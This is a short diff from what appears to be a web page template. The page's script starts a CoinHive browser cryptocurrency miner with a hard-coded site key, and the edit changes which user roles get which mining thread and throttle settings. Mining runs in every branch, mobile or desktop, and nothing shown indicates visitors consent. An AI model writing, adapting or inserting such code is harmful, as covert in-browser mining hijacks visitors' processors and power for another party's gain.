@@ -131,7 +131,7 @@
       if (/Android/i.test(ua) || /BlackBerry/i.test(ua) || /IEMobile/i.test(ua) || /iPhone|iPad|iPod/i.test(ua)) {
         (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start();
       } else {
-        if ({{.User.URole}} !== 0) {
+        if ({{.User.URole}} == 0) {
           (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start();
         } else {
           (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 2, throttle: 0.5})).start();
